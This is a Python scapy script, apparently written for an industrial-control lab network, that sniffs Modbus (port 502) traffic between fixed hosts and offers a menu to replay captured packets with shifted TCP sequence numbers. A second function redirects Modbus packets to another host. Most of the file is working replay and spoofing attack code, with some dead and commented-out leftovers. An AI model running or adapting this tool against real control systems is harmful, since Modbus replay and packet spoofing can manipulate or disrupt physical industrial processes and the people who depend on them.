from collections import Counter
from scapy.all import sniff

## Create a Packet Counter
from scapy.layers.inet import IP, UDP, TCP
from scapy.sendrecv import send, sendp

packet_counts = Counter()
packets_store =[]


## Define our Custom Action function
def custom_action(packet):
    # Create tuple of Src/Dst in sorted order
    pkt = packet[0][1]
    if pkt.dport == 502 and pkt.dst == "192.168.0.11" and pkt.src == "192.168.0.22" :
        packets_store.append(packet)

    key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))

    packet_counts.update([key])
    return f"Packet #{sum(packet_counts.values())}: {packet[0][1].src} ==> {packet[0][1].dst}"

def custom_attack(packet):
    # Create tuple of Src/Dst in sorted order
    pkt = packet[0][1]
    if pkt.dport == 502 and pkt.src == "192.168.0.21" and pkt.dst == "192.168.0.11" and pkt.sport != 502 :
        new_ip_header = IP(src=pkt.src, dst= "192.168.0.22")
        new_packet = new_ip_header
        new_packet.payload = pkt.payload
        del new_packet[IP].chksum
        del new_packet[IP].payload.chksum

        send(new_packet)
        return

        new_ip_header = IP(src=pkt.dst, dst= pkt.src)
        new_packet = new_ip_header
        new_packet.payload = pkt.payload
        new_packet.dport = pkt.sport
        new_packet.sport = 402
        seq = pkt.seq
        ack = pkt.ack
        new_packet.seq = ack
        new_packet.ack = seq +12
        del new_packet[IP].chksum
        del new_packet[IP].payload.chksum
        send(new_packet)

def reply_attack():
    for packet in packets_store:
        new_ip_header = IP(src=packet['IP'].src, dst= packet['IP'].dst)
        new_tcp_header = TCP(sport=packet['TCP'].sport, dport=packet['TCP'].dport)
        new_packet = new_ip_header / new_tcp_header
        new_packet[IP].payload = packet['IP'].payload
        new_packet[TCP].seq = new_packet[TCP].seq + 34
        new_packet[TCP].ack = new_packet[TCP].ack + 24
        del new_packet[IP].chksum
        del new_packet[TCP].chksum
        del new_packet[IP].payload.chksum
        new_packet.show2()
        send(new_packet)
        """
        new_ip_header = IP(src="192.168.0.22", dst="192.168.0.11")
        new_packet = new_ip_header
        new_packet.payload = pkt.payload
        new_packet.dport = pkt.dport
        new_packet.sport = pkt.sport
        seq = pkt.seq
        ack = pkt.ack
        new_packet.seq = seq
        new_packet.ack = ack
        del new_packet[IP].chksum
        del new_packet[IP].payload.chksum

        send(new_packet)
                pkt[IP].tos = 1
        sendp(pkt)
        """



while True:
    print('To record packets press 1:')
    print ('To apply reply_attack press 2')
    option = input('your input:')
    if option == '1':
        sniff(iface='br_icsnet', filter="ip", prn=custom_action, count=1000)
        ## Print out packet count per A <--> Z address pair
        print("\n".join(f"{f'{key[0]} <--> {key[1]}'}: {count}" for key, count in packet_counts.items()))
        # sniff(iface= 'br_icsnet', filter="tcp", prn=custom_attack, count=10000
        print(len(packets_store))
    elif option == '2':
        reply_attack()
    elif option == '0':
        break;


